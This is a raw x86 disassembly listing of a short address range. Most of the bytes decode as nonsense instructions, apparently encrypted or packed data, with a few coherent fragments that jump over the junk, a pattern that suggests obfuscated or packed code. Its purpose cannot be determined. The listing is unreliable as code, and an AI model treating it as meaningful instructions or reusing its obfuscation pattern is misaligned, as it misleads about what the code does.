  410c6e:	mov    gs,WORD PTR [ebx-0x47223ab0]
  410c74:	dec    ecx
  410c75:	push   ds
  410c76:	or     al,0x5b
  410c78:	outs   dx,BYTE PTR ds:[esi]
  410c79:	fst    QWORD PTR [eax*4-0x66033265]
  410c80:	push   0x25
  410c82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c83:	inc    esi
  410c84:	ja     0x410c57
  410c86:	cmp    BYTE PTR [ecx],ah
  410c88:	sbb    ch,bl
  410c8a:	mov    edx,0x675d9902
  410c8f:	shrd   ebx,ebp,0xab
  410c93:	sbb    esi,DWORD PTR ds:0x2a86a43c
  410c99:	mov    esp,0x3778d1f9
  410c9e:	jno    0x410c6a
  410ca0:	imul   edx,DWORD PTR [edi],0xde334004
  410ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ca7:	int3   
  410ca8:	fwait
  410ca9:	enter  0xe1cf,0x2b
  410cad:	and    ch,cl
  410caf:	mov    ah,0xe6
  410cb1:	les    ecx,FWORD PTR [ecx+0x1b]
  410cb4:	jge    0x410d2d
  410cb6:	xchg   ecx,eax
  410cb7:	or     BYTE PTR [edi-0x1bce655d],bh
  410cbd:	inc    ecx
  410cbe:	out    0x2a,al
  410cc0:	int    0x88
  410cc2:	and    eax,0xb9609d0b
  410cc7:	add    esi,DWORD PTR [edx-0x1a]
  410cca:	in     eax,dx
  410ccb:	mov    ah,0x5e
  410ccd:	pop    edi
  410cce:	fist   WORD PTR [edi]
  410cd0:	mov    ?,WORD PTR [esi-0x17]
  410cd3:	push   edi
  410cd4:	icebp  
  410cd5:	(bad)  
  410cd6:	jmp    0x42e8:0x23741152
  410cdd:	test   edi,eax
  410cdf:	popa   
  410ce0:	sub    al,0x66
  410ce2:	and    BYTE PTR [ebx+esi*8-0x43111708],bl
  410ce9:	cmp    edi,ebp
  410ceb:	inc    ecx
  410cec:	pop    ebp
  410ced:	sub    BYTE PTR [esp+ecx*8-0x2ab3b73a],0xc4
  410cf5:	mov    al,ds:0x3718e01b
  410cfa:	cli    
  410cfb:	fstp   QWORD PTR [edi-0x6eb536cc]
  410d01:	and    eax,0xcf01e751
  410d06:	retf   0xf62b
  410d09:	sbb    eax,0x24019dca
  410d0e:	xor    DWORD PTR [edi-0x5b30b808],0x9ef134b5
  410d18:	mov    al,0x57
  410d1a:	lods   al,BYTE PTR ds:[esi]
  410d1b:	and    dl,ch
  410d1d:	outs   dx,BYTE PTR ds:[esi]
  410d1e:	sti    
  410d1f:	push   es
  410d20:	xchg   BYTE PTR [ecx],al
  410d22:	sbb    BYTE PTR [ebx-0x6fc2ead],ch
  410d28:	add    edx,ecx
  410d2a:	imul   edx,edi
  410d2d:	mov    edi,DWORD PTR [ebp-0x8]
  410d30:	mov    ebx,DWORD PTR [ebp-0x10]
  410d33:	sub    ebx,edi
  410d35:	cmp    ebx,edx
  410d37:	ja     0x410d45
  410d3d:	mov    edx,DWORD PTR [ebp-0x2c]
  410d40:	jmp    0x411f76
  410d45:	mov    edx,DWORD PTR [ebp-0x34]
  410d48:	mov    edi,DWORD PTR [ebp-0x4]
  410d4b:	xor    edx,eax
  410d4d:	xor    edi,eax
  410d4f:	jmp    0x410fd7
  410d54:	lds    edi,FWORD PTR [edx+edx*8]
  410d57:	ds fxch st(6)
  410d5a:	fxch   st(3)
  410d5c:	adc    ecx,edx
  410d5e:	add    dh,BYTE PTR [edi]
  410d60:	xor    eax,0xf80dc699
  410d65:	push   esp
  410d66:	js     0x410de0
  410d68:	in     eax,0x7e
  410d6a:	js     0x410de4
  410d6c:	push   es
  410d6d:	pop    ss
  410d6e:	pop    es
  410d6f:	dec    esp
  410d70:	pop    ecx
  410d71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d72:	xchg   edi,edx
  410d74:	daa    
  410d75:	fwait
  410d76:	(bad)  
  410d77:	jo     0x410d02
  410d79:	xor    eax,0xd73ef644
  410d7e:	aad    0x6e
  410d80:	call   0x71dd:0x5e868212
  410d87:	adc    al,0xed
  410d89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d8a:	jmp    0x8e92:0xf2762881
  410d91:	xchg   DWORD PTR [ebx-0x54],edx
  410d94:	xchg   esi,eax
  410d95:	cmp    eax,0x65cb8257
  410d9a:	jmp    0xddea95c2
  410d9f:	ss test dh,dl
  410da2:	out    dx,al
  410da3:	dec    eax
  410da4:	inc    ebp
  410da5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410da6:	and    DWORD PTR ds:0x9306d3af,edi
  410dac:	pop    esp
  410dad:	mov    edx,0xb2692aac
  410db2:	push   cs
  410db3:	dec    edx
  410db4:	mov    bh,0xac
  410db6:	sub    al,0xb6
  410db8:	fdiv   QWORD PTR ds:0x3c7db084
  410dbe:	int    0x11
  410dc0:	inc    ecx
  410dc1:	xlat   BYTE PTR ds:[ebx]
  410dc2:	add    DWORD PTR [ebx-0x36560927],eax
  410dc8:	jnp    0x410dec
  410dca:	cwde   
  410dcb:	(bad)  
  410dcc:	fistp  WORD PTR [edx]
  410dce:	cmp    al,0x92
  410dd0:	ret    
  410dd1:	push   ebp
  410dd2:	fidivr WORD PTR [ecx]
  410dd4:	dec    eax
  410dd5:	dec    esp
  410dd6:	(bad)  
  410dd8:	cmp    al,0xa7
  410dda:	sub    al,BYTE PTR [eax-0x227ea4f8]
  410de0:	rcl    BYTE PTR [eax*8-0x7cf20075],cl
  410de7:	imul   esi,DWORD PTR [eax-0x65e3bb78],0x79
  410dee:	(bad)  
  410def:	ja     0x410e66
  410df1:	inc    edx
  410df2:	mov    ds,WORD PTR [ebp-0x79dc0229]
  410df8:	pop    eax
  410df9:	stos   BYTE PTR es:[edi],al
  410dfa:	fcmovnu st,st(5)
  410dfc:	push   ebx
  410dfd:	pushf  
  410dfe:	mov    ch,0x39
  410e00:	fcmovne st,st(6)
  410e02:	sub    cl,0xb5
  410e05:	lods   al,BYTE PTR ds:[esi]
  410e06:	mov    eax,DWORD PTR [eax-0x4]
  410e09:	jo     0x410e7c
  410e0b:	aas    
  410e0c:	xchg   edi,eax
  410e0d:	add    DWORD PTR [ebx+0x65],esp
  410e10:	pop    ds
  410e11:	pop    ss
  410e12:	(bad)  
  410e13:	leave  
  410e14:	mov    al,ds:0x5d2486d8
  410e19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e1a:	lahf   
  410e1b:	mov    bl,0x75
  410e1d:	fisttp DWORD PTR [esi+0x47484051]
  410e23:	xchg   ecx,eax
  410e24:	mov    esp,0xb310de26
  410e29:	jp     0x410daf
  410e2b:	xchg   ecx,eax
  410e2c:	jbe    0x410dc8
  410e2e:	push   eax
  410e2f:	xor    BYTE PTR [edx+0x3794997],dl
  410e35:	dec    esp
  410e36:	xor    al,0xb6
  410e38:	cwde   
  410e39:	pop    ds
  410e3a:	push   ds
  410e3b:	inc    eax
  410e3c:	js     0x410e22
  410e3e:	std    
  410e3f:	add    dh,al
  410e41:	dec    esp
  410e42:	(bad)  
  410e43:	pop    ds
  410e44:	sub    eax,0x8d7eec9b
  410e49:	xchg   BYTE PTR [edi+0x610f10cf],dh
  410e4f:	ins    BYTE PTR es:[edi],dx
  410e50:	fdiv   DWORD PTR [eax+0x1735e99]
  410e56:	fstp   st(6)
  410e58:	aad    0x59
  410e5a:	aaa    
  410e5b:	mov    es,WORD PTR [eax+0x1628f92c]
  410e61:	xchg   ebp,eax
  410e62:	(bad)  
  410e64:	jecxz  0x410ea7
  410e66:	inc    ebp
  410e67:	outs   dx,BYTE PTR ds:[esi]
  410e68:	in     eax,0x9e
  410e6a:	sub    al,BYTE PTR [edi]
  410e6c:	adc    al,0x3b
  410e6e:	inc    esi
  410e6f:	(bad)
  410e72:	sar    BYTE PTR [edi],0x6
  410e75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e76:	cmp    ecx,edx
  410e78:	pop    ds
  410e79:	mov    DWORD PTR [ecx-0x715c3237],ecx
  410e7f:	mov    edi,0x8d3794f6
  410e84:	ins    DWORD PTR es:[edi],dx
  410e85:	add    esp,DWORD PTR [edi+0x42]
  410e88:	sub    al,bh
  410e8a:	jge    0x410e4b
  410e8c:	pop    eax
  410e8d:	jb     0x410e23
  410e8f:	fwait
  410e90:	daa    
  410e91:	in     al,dx
  410e92:	and    DWORD PTR [edi-0xa],eax
  410e95:	add    DWORD PTR [ecx+0x7b],esi
  410e98:	sbb    edx,ebp
  410e9a:	mov    esp,0x6957e7dd
  410e9f:	mov    al,ds:0xc8b9207f
  410ea4:	inc    esi
  410ea5:	pop    es
  410ea6:	enter  0xd4b8,0xce
  410eaa:	(bad)
  410ead:	xor    BYTE PTR [ebx-0x6ba84901],ah
  410eb3:	and    BYTE PTR [ecx],0xcd
  410eb6:	into   
  410eb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410eb8:	retf   0x9320
  410ebb:	sub    ecx,0x34bb8c58
  410ec1:	jp     0x410eb6
  410ec3:	mov    ecx,0x979cb98a
  410ec8:	dec    ecx
  410ec9:	jmp    0x3e49381
  410ece:	imul   edx,DWORD PTR [edi+0x7d358971],0xffffff92
  410ed5:	ret    0xde27
  410ed8:	mov    cl,0xd0
  410eda:	pop    DWORD PTR [eax]
  410edc:	cdq    
  410edd:	and    eax,0x2d99a1bc
  410ee2:	not    ebp
  410ee4:	stos   DWORD PTR es:[edi],eax
  410ee5:	das    
  410ee6:	aas    
  410ee7:	jbe    0x410ef4
  410ee9:	inc    edx
  410eea:	data16 aad 0x15
  410eed:	cmp    eax,0x1367a670
  410ef2:	pop    edi
  410ef3:	inc    esp
  410ef4:	fbstp  TBYTE PTR [edx-0xa]
  410ef7:	pop    ebp
  410ef8:	mov    ebx,0xc11f489f
  410efd:	cmc    
  410efe:	jnp    0x410f45
  410f00:	or     al,0xdf
  410f02:	cld    
  410f03:	ret    0xda71
  410f06:	stos   DWORD PTR es:[edi],eax
  410f07:	sbb    DWORD PTR [ecx-0x1a],esp
  410f0a:	add    ebx,esp
  410f0c:	xchg   esi,eax
  410f0d:	xor    edi,DWORD PTR [edx]
  410f0f:	cmp    al,0x28
  410f11:	dec    DWORD PTR [ecx]
  410f13:	fisttp DWORD PTR [esi]
  410f15:	lds    esi,FWORD PTR [esp-0x4f301be8]
  410f1c:	in     eax,0xb
  410f1e:	mov    al,0xdd
  410f20:	inc    ecx
  410f21:	jmp    0xd317:0x2514c16c
  410f28:	aam    0x2
  410f2a:	and    BYTE PTR [ebx],ch
  410f2c:	lahf   
  410f2d:	mov    ch,0x17
  410f2f:	dec    ebp
  410f30:	fld    TBYTE PTR [edx]
  410f32:	jmp    0x767b:0x379400a6
  410f39:	lds    esp,FWORD PTR [eax]
  410f3b:	inc    ebx
  410f3c:	lds    esi,FWORD PTR [ecx]
  410f3e:	popf   
  410f3f:	ret    0x1a42
  410f42:	lods   al,BYTE PTR ds:[esi]
  410f43:	nop
  410f44:	or     edx,DWORD PTR [ebp+0x305ccf8a]
  410f4a:	aas    
  410f4b:	xor    BYTE PTR [edx-0x72],0x1d
  410f4f:	push   edi
  410f50:	jnp    0x410f92
  410f52:	inc    ebx
  410f53:	jg     0x410fd3
  410f55:	stc    
  410f56:	jecxz  0x410f19
  410f58:	(bad)  
  410f59:	(bad)  
  410f5a:	in     al,0x45
  410f5c:	push   edx
  410f5d:	call   0x29d7:0x68433bb3
  410f64:	mov    ecx,0x957abb52
  410f69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f6a:	jmp    0x5e40d29f
  410f6f:	cs adc eax,0x7d6debf7
  410f75:	jnp    0x410fb9
  410f77:	mov    bl,0x9b
  410f79:	outs   dx,BYTE PTR ds:[esi]
  410f7a:	push   ss
  410f7b:	(bad)  
  410f7c:	repnz xor eax,esi
  410f7f:	pop    ebp
  410f80:	mov    bl,0x8d
  410f82:	pop    ds
  410f83:	or     al,0x94
  410f85:	addr16 sub cl,al
  410f88:	out    dx,eax
  410f89:	add    DWORD PTR [esi],0xe69b9c5f
  410f8f:	sub    esi,DWORD PTR [ecx-0x7267dcd6]
  410f95:	jg     0x410f87
  410f97:	jmp    0x410fb9
  410f99:	mov    ebx,0x381eba2f
  410f9e:	inc    eax
  410f9f:	sahf   
  410fa0:	rcr    dl,cl
  410fa2:	jno    0x410fd3
  410fa4:	and    al,0x85
  410fa6:	or     cl,BYTE PTR cs:[ecx]
  410fa9:	stos   WORD PTR es:[edi],ax
  410fab:	ror    BYTE PTR [ebp-0x28],1
  410fae:	sbb    esi,DWORD PTR [bx+0x46]
  410fb2:	sbb    BYTE PTR [esi],dl
  410fb4:	fisttp QWORD PTR [edi-0x186a7b8a]
  410fba:	mov    cl,0x79
  410fbc:	xor    al,0x33
  410fbe:	mul    bl
  410fc0:	pop    DWORD PTR [ecx+0x43]
  410fc3:	and    eax,0xc344996d
  410fc8:	mov    ds:0x807033ea,al
  410fcd:	adc    BYTE PTR [edx],0x78
  410fd0:	cld    
  410fd1:	loopne 0x410faa
  410fd3:	inc    esi
  410fd4:	xor    ch,BYTE PTR [esp+eax*2]
  410fd7:	add    edi,ecx
  410fd9:	jmp    0x411261
  410fde:	int3   
  410fdf:	into   
  410fe0:	ror    esp,0xc1
  410fe3:	rcl    ecx,cl
  410fe5:	into   
  410fe6:	jbe    0x410f92
  410fe8:	inc    esp
  410fe9:	data16 (bad) 
  410feb:	cli    
  410fec:	xor    eax,0x785a65c7
  410ff1:	js     0x410fd8
  410ff3:	jle    0x41106d
  410ff5:	js     0x41105b
  410ff7:	imul   esi,DWORD PTR ds:0x9009adc7,0x4d
  410ffe:	call   0x79685dc9
  411003:	jmp    0xd93f9cd
  411008:	pop    ecx
  411009:	push   eax
  41100a:	mov    ebx,0xbca34c23
  41100f:	(bad)  
  411011:	ret    0xbd5d
  411014:	pop    eax
  411015:	xchg   edx,eax
  411016:	fstp   TBYTE PTR [ecx]
  411018:	jnp    0x41106b
  41101a:	test   eax,0xd8b07354
  41101f:	bound  esi,QWORD PTR [ecx]
  411021:	mov    ds:0xdb1f95e8,al
  411026:	push   es
  411027:	lods   eax,DWORD PTR ds:[esi]
  411028:	leave  
  411029:	nop
  41102a:	mov    BYTE PTR [esi+0x35],dh
  41102d:	rcl    BYTE PTR [edx+edx*8+0x5c],0x6b
  411032:	xchg   edx,eax
  411033:	loopne 0x41102a
  411035:	add    eax,0xe41b8109
  41103a:	mov    edi,0xe092a9b8
  41103f:	sub    ch,BYTE PTR [ebx+0x67]
  411042:	cmp    DWORD PTR [ecx+0x4],ebp
  411045:	aad    0xa2
  411047:	sbb    eax,0x1b2332ff
  41104c:	jmp    0x5dee:0x44965d17
  411053:	jnp    0x41103f
  411055:	outs   dx,BYTE PTR ds:[esi]
  411056:	pop    esp
  411057:	xor    ebx,ebp
  411059:	ja     0x410fef
  41105b:	scas   al,BYTE PTR es:[edi]
  41105c:	fst    DWORD PTR [eax+0x61]
  41105f:	adc    edx,DWORD PTR [edi+edx*1+0x39]
  411063:	push   ds
  411064:	int3   
  411065:	and    al,0x58
  411067:	in     eax,dx
  411068:	js     0x41108b
  41106a:	and    ch,BYTE PTR [ebx]
  41106c:	pop    esi
  41106d:	push   0x1fb0269f
  411072:	push   es
  411073:	push   esp
  411074:	arpl   WORD PTR [edi+esi*4+0x5622c47b],bx
  41107b:	stc    
  41107c:	call   0x4ed40ffd
  411081:	out    0x89,al
  411083:	cmp    esp,ebx
  411085:	lods   al,BYTE PTR ds:[esi]
  411086:	test   eax,0xb21237fe
  41108b:	jne    0x41103d
  41108d:	fwait
  41108e:	adc    al,dh
  411090:	mov    ch,BYTE PTR [ebx-0x7c752fe]
  411096:	fwait
  411097:	pop    ss
  411098:	ror    BYTE PTR [eax-0x1b484eed],cl
  41109e:	push   cs
  41109f:	aam    0x59
  4110a1:	mov    ds:0xf6b5fc06,eax
  4110a6:	xchg   edi,eax
  4110a7:	cdq    
  4110a8:	lods   al,BYTE PTR ds:[esi]
  4110a9:	xchg   edx,eax
  4110aa:	dec    edx
  4110ab:	push   ds
  4110ac:	mov    esi,0xed2954a3
  4110b1:	cmp    eax,0x779561e6
  4110b6:	out    dx,al
  4110b7:	lods   eax,DWORD PTR ds:[esi]
  4110b8:	in     eax,0xce
  4110ba:	mov    ?,WORD PTR [ebx+eax*2]
  4110bd:	jmp    0x4ebf:0xf28f3059
  4110c4:	lock into 
  4110c6:	push   esp
  4110c7:	(bad)  
  4110c8:	mov    edi,0x4b2939f9
  4110cd:	stos   BYTE PTR es:[edi],al
  4110ce:	or     BYTE PTR [esi],al
  4110d0:	mov    ebx,0x58021892
  4110d5:	or     dl,BYTE PTR [ecx*1+0x2b3ce2c2]
  4110dc:	aaa    
  4110dd:	cmc    
  4110de:	mov    eax,ds:0x41908681
  4110e3:	je     0x41115a
  4110e5:	lods   eax,DWORD PTR ds:[esi]
  4110e6:	sub    bh,0x6c
  4110e9:	dec    edx
  4110ea:	and    BYTE PTR [edi+0x5c00cad9],0x6
  4110f1:	dec    eax
  4110f2:	aad    0x81
  4110f4:	mov    esp,0xb5281cfd
  4110f9:	mov    cl,0xdf
  4110fb:	add    edi,ebx
  4110fd:	ret    
  4110fe:	sbb    eax,0xee5d98fd
  411103:	mov    cl,0x5e
  411105:	xchg   ebx,eax
  411106:	cmp    ch,ch
  411108:	adc    DWORD PTR [ecx-0x5d],ecx
  41110b:	scas   eax,DWORD PTR es:[edi]
  41110c:	(bad)  
  41110d:	cmp    dl,BYTE PTR [edx+edx*2-0x10]
  411111:	xchg   esp,eax
  411112:	shr    ch,1
  411114:	inc    esp
  411115:	jp     0x4110a9
  411117:	xor    eax,0xe172a65d
  41111c:	add    eax,0x6fd70f77
  411121:	xor    al,0x27
  411123:	popf   
  411124:	loope  0x411157
  411126:	outs   dx,BYTE PTR ds:[esi]
  411127:	fcmovu st,st(0)
  411129:	adc    BYTE PTR [ebx+ebx*4+0x6e],0x31
  41112e:	sti    
  41112f:	fstenv [edi]
  411132:	xchg   ebp,eax
  411133:	push   ecx
  411134:	call   0x7769:0x9c4c4333
  41113b:	pop    ds
  41113c:	(bad)  
  41113e:	mov    fs,WORD PTR [edx+0x24]
  411141:	push   es
  411142:	arpl   WORD PTR [edx],si
  411144:	sahf   
  411145:	push   cs
  411146:	aad    0x5c
  411148:	mov    ds:0x8434bbf7,eax
  41114d:	popf   
  41114e:	test   DWORD PTR [edx+0x7a],edx
  411151:	xchg   ecx,eax
  411152:	ins    BYTE PTR es:[edi],dx
  411153:	pop    ds
  411154:	mov    bl,0x6c
  411156:	pop    ebp
  411157:	mov    eax,ds:0x2bdc065e
  41115c:	jle    0x411114
  41115e:	xor    BYTE PTR [esi-0x75ec44da],dl
  411164:	dec    ebp
  411165:	lods   al,BYTE PTR ds:[esi]
  411166:	retf   
  411167:	test   BYTE PTR fs:[esi],dh
  41116a:	(bad)  
  41116b:	enter  0xe7ff,0x5a
  41116f:	pushf  
  411170:	arpl   WORD PTR [ecx],si
  411172:	mov    ds:0xe0771ad9,eax
  411177:	jmp    0xbe9e8b89
  41117c:	clc    
  41117d:	mov    al,ds:0xd6c4aac3
  411182:	push   ebp
  411183:	pushf  
  411184:	pushf  
  411185:	iret   
  411186:	add    edi,DWORD PTR [ebp+0x52]
  411189:	ins    BYTE PTR es:[edi],dx
  41118a:	or     eax,0x8a782650
  41118f:	ss icebp 
  411191:	push   edi
  411192:	repz shr BYTE PTR [ebx-0x2e248b37],0xdc
  41119a:	retf   
  41119b:	or     bl,al
  41119d:	mov    ebp,0xe80d10f8
  4111a2:	xchg   esi,eax
  4111a3:	dec    ecx
  4111a4:	call   FWORD PTR [ebp-0x3320d85f]
  4111aa:	cwde   
  4111ab:	test   BYTE PTR [ebx-0x124b99d4],0x5b
  4111b2:	(bad)  
  4111b3:	adc    eax,DWORD PTR cs:[edx-0x7c2cbc72]
  4111ba:	adc    edi,ebx
  4111bc:	imul   edx,DWORD PTR [ebx],0xffffff8c
  4111bf:	adc    BYTE PTR [ebx+0x1b],al
  4111c2:	ins    DWORD PTR es:[edi],dx
  4111c3:	rol    BYTE PTR [eax+0x31],0xfd
  4111c7:	stc    
  4111c8:	aam    0xc6
  4111ca:	bound  edi,QWORD PTR [eax]
  4111cc:	sbb    BYTE PTR [esi+0x29],bl
  4111cf:	je     0x4111ca
  4111d1:	loope  0x4111d0
  4111d3:	inc    ebx
  4111d4:	xchg   edi,eax
  4111d5:	ins    BYTE PTR es:[edi],dx
  4111d6:	in     al,0x95
  4111d8:	dec    esi
  4111d9:	pop    ds
  4111da:	add    al,0xb3
  4111dd:	dec    edi
  4111de:	shr    DWORD PTR [esi-0x62],0x1d
  4111e2:	(bad)  
  4111e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111e5:	mov    esi,0x4f890712
  4111ea:	stos   BYTE PTR es:[edi],al
  4111eb:	jmp    0x411269
  4111ed:	test   al,0x3
  4111ef:	out    dx,eax
  4111f0:	or     ebx,edx
  4111f2:	xchg   edi,eax
  4111f3:	cdq    
  4111f4:	loop   0x4111d3
  4111f6:	fnstsw WORD PTR [esi+0x21f4d012]
  4111fc:	fstp   TBYTE PTR [esi-0x15]
  4111ff:	mov    bh,0x78
  411201:	cwde   
  411202:	lds    ecx,FWORD PTR [ebp-0x3c]
  411205:	mov    bh,0xd5
  411207:	out    0x1d,eax
  411209:	int    0xde
  41120b:	sar    bl,0xa8
  41120e:	clc    
  41120f:	into   
  411210:	lock psrlq mm4,QWORD PTR [ebx-0x5c0e7ef4]
  411218:	and    ebp,DWORD PTR [ebp+0x4fe80f91]
  41121e:	mov    BYTE PTR ds:0x33012f5d,ch
  411224:	jle    0x4111ff
  411226:	out    0x29,eax
  411228:	leave  
  411229:	out    0xcf,al
  41122b:	aad    0x1c
  41122d:	into   
  41122e:	push   ebx
  41122f:	outs   dx,DWORD PTR ds:[esi]
  411230:	adc    BYTE PTR [ebx],dl
  411232:	mov    ebp,ecx
  411234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411235:	test   BYTE PTR [ebp-0x11f78bc5],cl
  41123b:	xor    cl,BYTE PTR [ecx-0x1c]
  41123e:	daa    
  41123f:	aad    0x80
  411241:	push   edi
  411242:	repnz pop edx
  411244:	fwait
  411245:	jecxz  0x4112a1
  411247:	dec    edx
  411248:	into   
  411249:	cmc    
  41124a:	mov    bl,0xa3
  41124c:	cdq    
  41124d:	xor    al,0xcb
  41124f:	cmp    BYTE PTR [esp+eax*1-0x3766009b],dl
  411256:	stos   DWORD PTR es:[edi],eax
  411257:	in     eax,0x30
  411259:	ficom  DWORD PTR ds:0x78cbe796
  41125f:	jo     0x4112c5
  411261:	add    edx,ecx
  411263:	imul   edx,edi
  411266:	jmp    0x4114ee
  41126b:	aas    
  41126c:	xlat   BYTE PTR ds:[ebx]
  41126d:	xlat   BYTE PTR ds:[ebx]
  41126e:	retf   
  41126f:	xlat   BYTE PTR ds:[ebx]
  411270:	retf   
  411271:	rcr    ebx,cl
  411273:	and    cl,ah
  411275:	or     BYTE PTR [eax+0x22],al
  411278:	(bad)  
  411279:	shl    BYTE PTR [edx+edx*8+0x5f],cl
  41127d:	js     0x4112f7
  41127f:	in     eax,0x7e
  411281:	js     0x4112fb
  411283:	push   ebp
  411284:	mov    bh,0x28
  411286:	arpl   si,ax
  411288:	(bad)  
  411289:	cmp    cl,BYTE PTR [ebx-0x41]
  41128c:	xor    eax,0x5881b9bb
  411291:	imul   ebp,DWORD PTR ds:0xc74fadaf,0xd89f9086
  41129b:	mov    dl,BYTE PTR [eax]
  41129d:	stos   DWORD PTR es:[edi],eax
  41129e:	inc    esi
  41129f:	out    0x2f,eax
  4112a1:	fucomp st(1)
  4112a3:	in     al,0x2f
  4112a5:	je     0x411263
  4112a7:	lods   al,BYTE PTR gs:[esi]
  4112a9:	mov    ecx,0x654d9cbb
  4112ae:	cld    
  4112af:	fisttp DWORD PTR [edi]
  4112b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112b2:	jmp    0x95ba4b98
  4112b7:	loopne 0x4112d7
  4112b9:	mov    bl,0xf
  4112bb:	pop    edx
  4112bc:	aam    0xb8
  4112be:	int    0x3b
  4112c0:	in     al,dx
  4112c1:	in     eax,dx
  4112c2:	das    
  4112c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112c4:	add    bl,cl
  4112c6:	imul   ecx,DWORD PTR [ebp+ebp*1+0x1c],0xd76c5f3e
  4112ce:	pop    ebp
  4112cf:	nop
  4112d0:	jle    0x411302
  4112d2:	lds    ecx,FWORD PTR [eax+0x16da9816]
  4112d8:	xchg   ebx,eax
  4112d9:	out    dx,al
  4112da:	(bad)  
  4112db:	push   edx
  4112dc:	push   ss
  4112dd:	out    dx,eax
  4112de:	sub    ecx,DWORD PTR [eax+0x30]
  4112e1:	adc    BYTE PTR [edi+ebp*4],dh
  4112e4:	test   BYTE PTR [edi+edi*1],0x55
  4112e8:	(bad)  
  4112e9:	stc    
  4112ea:	add    eax,0x7018c7f0
  4112ef:	dec    edi
  4112f0:	mov    DWORD PTR [eax+0x3f],ecx
  4112f3:	mov    ah,0x77
  4112f5:	xlat   BYTE PTR ds:[ebx]
  4112f6:	arpl   WORD PTR [ecx+0x64],cx
  4112f9:	rol    DWORD PTR [ebx+0x12],1
  4112fc:	jmp    DWORD PTR [eax-0x6]
  4112ff:	jne    0x411375
  411301:	sub    al,0x65
  411303:	mov    edi,0xcabf6c60
  411308:	push   0x4e17c450
  41130d:	jmp    0x4112ea
  41130f:	test   al,0xd7
  411311:	repz jnp 0x41130d
  411314:	mov    dh,0x32
  411316:	js     0x411350
  411318:	in     eax,dx
  411319:	adc    eax,0xbfa070ba
  41131e:	sar    dh,cl
  411320:	mov    eax,0xba169036
  411325:	leave  
  411326:	call   0x827bc6a7
  41132b:	pop    ss
  41132c:	loop   0x4113a7
  41132e:	lods   eax,DWORD PTR ds:[esi]
  41132f:	cmp    esi,esp
  411331:	arpl   WORD PTR [esi],bx
  411333:	dec    eax
  411334:	push   ecx
  411335:	push   esi
  411336:	push   ds
  411337:	das    
  411338:	(bad)  
  411339:	cmc    
  41133a:	lahf   
  41133b:	aam    0xff
  41133d:	xchg   edi,eax
  41133e:	out    dx,eax
  41133f:	or     al,0xa0
  411341:	mov    eax,0xbaf17e7
  411346:	iret   
  411347:	mov    ds:0xf4f412af,eax
  41134c:	or     eax,0xf940c2e1
  411351:	call   0x8cf7:0x4c2b253b
  411358:	mov    edi,0x3113fb91
  41135d:	sahf   
  41135e:	sti    
  41135f:	pop    eax
  411360:	jb     0x4113d8
  411362:	jmp    0x84ffbb7d
  411367:	mov    gs,esp
  411369:	mov    dh,0xcd
  41136b:	retf   
  41136c:	dec    esp
  41136d:	(bad)  
  41136e:	in     al,0x80
  411370:	cmp    al,0xaa
  411372:	in     al,dx
  411373:	cld    
  411374:	inc    ebx
  411375:	xchg   edi,eax
  411376:	scas   eax,DWORD PTR es:[edi]
  411377:	clc    
  411378:	(bad)  
  411379:	retf   0x9845
  41137c:	add    DWORD PTR [ecx+esi*2+0x12],edx
  411380:	mov    WORD PTR [ebx+0xb],fs
  411383:	xchg   esi,eax
  411384:	xor    DWORD PTR [edx],0x16bb9dbe
  41138a:	push   cs
  41138b:	or     eax,ecx
  41138d:	repz jb 0x411360
  411390:	sbb    edx,DWORD PTR [ebp+0x29508bbe]
  411396:	mov    edx,0xd7096cf6
  41139b:	aaa    
  41139c:	lahf   
  41139d:	push   edi
  41139e:	dec    ebx
  41139f:	imul   edi,ebp,0x5f7e1ff1
  4113a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113a6:	and    edi,DWORD PTR [esi+esi*2+0x4]
  4113aa:	xchg   ebx,eax
  4113ab:	xchg   ecx,eax
  4113ac:	ja     0x4113d4
  4113ae:	outs   dx,DWORD PTR ds:[esi]
  4113af:	and    dl,BYTE PTR [ebp+0x63]
  4113b2:	aas    
  4113b3:	popa   
  4113b4:	cwde   
  4113b5:	add    ecx,edi
  4113b7:	std    
  4113b8:	rcr    DWORD PTR [edx+ecx*1-0x17],cl
  4113bc:	or     eax,0xaee04bf9
  4113c1:	add    al,BYTE PTR [eax+eiz*1-0x4b]
  4113c5:	push   ebx
  4113c6:	in     al,0xda
  4113c8:	outs   dx,DWORD PTR ds:[esi]
  4113c9:	mov    eax,ds:0xa424e9dd
  4113ce:	push   ds
  4113cf:	scas   eax,DWORD PTR es:[edi]
  4113d0:	fwait
  4113d1:	popf   
  4113d2:	pushf  
  4113d3:	loope  0x41135b
  4113d5:	or     DWORD PTR [ebx+0x63],ecx
  4113d8:	lods   al,BYTE PTR ds:[esi]
  4113d9:	and    ecx,DWORD PTR [ebx-0x4dfa2df2]
  4113df:	adc    BYTE PTR [esi],dh
  4113e1:	inc    ebp
  4113e2:	xor    eax,0x7ba13555
  4113e7:	test   ebp,edx
  4113e9:	pushf  
  4113ea:	out    dx,al
  4113eb:	scas   al,BYTE PTR es:[edi]
  4113ec:	aas    
  4113ed:	or     BYTE PTR [eax+0x2bb1d92d],cl
  4113f3:	aaa    
  4113f4:	jb     0x4113fa
  4113f6:	lahf   
  4113f7:	xchg   ebp,eax
  4113f8:	imul   ebp,esp,0x2f37e637
  4113fe:	mov    DWORD PTR fs:[ebx-0x65],esp
  411402:	pushf  
  411403:	xchg   ebp,eax
  411404:	dec    edi
  411405:	data16 jnp 0x4113a8
  411408:	pop    eax
  411409:	ins    DWORD PTR es:[edi],dx
  41140a:	xor    al,0x3e
  41140c:	clc    
  41140d:	(bad)  
  41140e:	add    al,0x92
  411410:	gs loope 0x4113c1
  411413:	mov    edx,0x5ec807b7
